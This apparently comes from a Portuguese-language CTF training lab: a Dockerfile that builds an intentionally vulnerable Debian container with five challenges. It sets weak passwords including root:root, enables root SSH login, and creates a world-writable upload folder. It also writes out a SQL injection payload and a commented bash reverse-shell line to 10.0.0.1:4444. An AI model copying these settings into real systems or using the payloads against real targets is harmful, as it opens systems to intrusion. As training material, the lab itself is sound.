FROM debian:12-slim

LABEL maintainer="CTF SENAI" description="CenÃ¡rio Pentest - 5 Desafios"

# Instalar apenas ferramentas essenciais
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server python3 netcat-openbsd nmap file apache2 sudo binutils wget ca-certificates \
    && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# SSH config
RUN mkdir -p /var/run/sshd && echo 'root:root' | chpasswd \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Criar usuÃ¡rio padrÃ£o (nÃ£o-privilegiado) para o terminal
RUN useradd -m -s /bin/bash user && echo 'user:user' | chpasswd

# Criar usuÃ¡rio vulnerÃ¡vel com senha fraca do rockyou.txt (posiÃ§Ã£o 73)
RUN useradd -m -s /bin/bash ctfuser && echo 'ctfuser:shadow' | chpasswd

# Criar todos os desafios
RUN mkdir -p /root/pentest /var/www/html/uploads \
    && echo "W34K_P4SSW0RD" > /home/ctfuser/flag.txt && chown ctfuser:ctfuser /home/ctfuser/flag.txt && chmod 600 /home/ctfuser/flag.txt \
    && echo "P0RT_SC4NN3R" > /root/pentest/scan_flag.txt \
    && chmod 777 /var/www/html/uploads && echo "UPL04D_VULN" > /var/www/html/uploads/flag.txt \
    && echo "' OR '1'='1" > /root/pentest/sqli_payload.txt && echo "SQL1_M4ST3R" > /root/pentest/sqli_flag.txt \
    && printf '#!/bin/bash\n# Reverse Shell Example\n# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Flag: R3V3RS3_SH3LL\n' > /root/pentest/revshell.sh \
    && chmod +x /root/pentest/revshell.sh && echo "R3V3RS3_SH3LL" > /root/pentest/revshell_flag.txt

# Criar README educativo estilo Bandit
RUN printf '=== CYBERSKILLS LAB - PENTEST ===\n\nBem-vindo aos desafios de Penetration Testing!\nVocÃª estÃ¡ logado como '\'user\''. Explore o sistema e encontre as vulnerabilidades.\n\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nDESAFIO 1: Weak Password\n\nObjetivo: Descobrir a senha de um usuÃ¡rio com credenciais fracas.\n\nInformaÃ§Ãµes:\nâ€¢ Existe um usuÃ¡rio no sistema com uma senha comum\nâ€¢ A flag estÃ¡ no diretÃ³rio home desse usuÃ¡rio\nâ€¢ Senhas fracas geralmente estÃ£o em wordlists pÃºblicas\n\nComandos Ãºteis:\nâ€¢ cat /etc/passwd          - Lista usuÃ¡rios do sistema\nâ€¢ su <usuario>             - Troca para outro usuÃ¡rio\nâ€¢ wget <url>               - Baixa arquivos da internet\nâ€¢ while read; do ... done  - Loop para ler linhas de arquivo\n\nDicas:\n1. Identifique quais usuÃ¡rios existem no sistema\n2. Wordlists famosas: rockyou.txt, common-passwords\n3. VocÃª pode automatizar tentativas de login com loops bash\n4. Pense: como testar mÃºltiplas senhas automaticamente?\n\nRecursos externos:\nâ€¢ Wordlists estÃ£o disponÃ­veis no repositÃ³rio do projeto\nâ€¢ Procure por "rockyou.txt" ou "common passwords wordlist"\n\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nğŸ’¡ Usando Google/IA como aliado:\n\nEstÃ¡ travado? Tudo bem usar Google ou IA (ChatGPT, Claude, etc), MAS:\n\nâœ… FAÃ‡A:\n  â€¢ Pergunte "Como funciona o comando while read em bash?"\n  â€¢ Pergunte "Como fazer loop em arquivo de texto no Linux?"\n  â€¢ Pergunte "O que Ã© brute force de senha?"\n  â€¢ Use para APRENDER os conceitos e comandos\n\nâŒ NÃƒO FAÃ‡A:\n  â€¢ Copiar e colar comandos prontos sem entender\n  â€¢ Pedir "resolva o desafio X para mim"\n  â€¢ Pular o aprendizado sÃ³ para pegar a flag\n\nO objetivo Ã© APRENDER, nÃ£o apenas completar!\nEntenda cada comando que vocÃª executa.\n\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nLembre-se: A melhor forma de aprender Ã© tentando sozinho primeiro!\nUse as dicas apenas se estiver realmente travado.\n\nBoa sorte, hacker!\n' > /home/user/README.txt \
    && chown user:user /home/user/README.txt

# Script de inicializaÃ§Ã£o
RUN printf '#!/bin/bash\nservice apache2 start\n/usr/sbin/sshd -D\n' > /start.sh && chmod +x /start.sh

EXPOSE 22 80
CMD ["/start.sh"]
